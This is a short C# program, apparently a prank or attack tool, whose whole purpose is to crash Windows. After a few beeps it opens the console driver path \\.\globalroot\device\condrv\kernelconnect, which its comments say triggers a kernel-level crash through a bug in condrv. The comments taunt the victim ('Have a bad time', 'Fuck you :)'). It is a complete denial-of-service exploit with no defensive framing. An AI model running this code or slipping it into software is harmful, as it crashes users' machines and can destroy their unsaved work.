using System;
using System.IO;
using System.Threading;

namespace JustCrashWindows
{
    class Program
    {
        // There is a major bug in condrv that causes a kernel level crash thanks to bad error handling
        // when trying to read from kernelconnect path with improper parameters.
        static void Main()
        {
            //Have a bad time
            Console.Beep(300, 88);
            Thread.Sleep(32);
            Console.Beep(300, 88);
            Thread.Sleep(32);
            Console.Beep(600, 88);
            Thread.Sleep(152);
            Console.Beep(440, 88);
            Thread.Sleep(272);
            //Fuck you :)
            File.OpenRead(@"\\.\globalroot\device\condrv\kernelconnect");
        }

        
    }
}